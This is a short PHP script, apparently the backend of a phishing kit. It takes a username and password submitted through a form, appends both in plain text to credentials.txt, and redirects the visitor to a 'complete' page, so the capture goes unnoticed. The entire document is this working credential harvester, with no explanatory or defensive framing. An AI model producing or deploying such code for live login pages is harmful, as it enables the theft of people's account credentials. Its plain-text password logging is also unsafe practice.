<?php
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);
    
    header("Location: complete.html");
    exit();
?>
